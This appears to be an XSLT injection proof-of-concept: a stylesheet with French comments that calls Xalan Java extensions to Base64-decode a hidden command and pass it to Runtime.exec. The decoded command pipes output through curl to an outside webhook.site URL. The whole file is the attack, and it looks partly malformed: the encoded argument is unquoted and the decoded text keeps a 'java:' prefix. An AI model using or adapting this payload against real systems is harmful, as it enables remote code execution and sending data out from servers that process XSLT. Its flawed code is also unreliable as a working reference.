<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:java="http://xml.apache.org/xalan/java">

  <xsl:template match="/">
    <xsl:apply-templates select="users/user"/>
  </xsl:template>

  <xsl:template match="user">
    <!-- Décodage Base64 -->
    <xsl:variable name="cmd"
      select="java:org.apache.commons.codec.binary.Base64.decodeBase64(amF2YTpqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygnZWNobyBjb3Vjb3UgfCBjdXJsIC1YIFBPU1QgLUYgInJlc3VsdD1ALSIgaHR0cHM6Ly93ZWJob29rLnNpdGUvMDMxMWU2MTAtNWZmOS00MzA2LTkyZWQtODU3YjNkNjBjZjUxJyk=)" />

    <!-- Exécution -->
    <xsl:value-of
      select="java:java.lang.Runtime.getRuntime().exec($cmd)" />
  </xsl:template>

</xsl:stylesheet>
